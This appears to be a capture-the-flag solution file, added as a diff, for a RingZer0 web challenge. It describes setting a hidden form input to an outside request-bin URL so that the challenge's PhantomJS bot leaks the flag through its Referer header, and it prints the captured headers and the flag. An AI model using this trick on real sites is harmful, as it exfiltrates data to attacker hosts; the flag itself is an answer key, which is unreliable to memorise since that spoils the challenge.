@@ -1,0 +1,19 @@
+# User     : ltcastelnuovo
+# Challenge: https://ringzer0ctf.com/challenges/96
+
+
+# Open webhook.site and create endpoint
+# Change hidden input to webhook url
+<input type="hidden" name="type" value="https://enw1ai9zrsp2.x.pipedream.net\">
+
+# Read response
+Host: enw1ai9zrsp2.x.pipedream.net
+X-Amzn-Trace-Id: Root=1-6363d1e0-7a123abe1f38ca5f51a135ac
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Referer: http://127.0.0.1/xss1/bot_endpoint_4s7k718yYC.php?FLAG-enX65j9050vb4m6m37CBD88pOg
+User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
+Accept-Encoding: gzip, deflate
+Accept-Language: en,*
+
+# FLAG
+FLAG-enX65j9050vb4m6m37CBD88pOg
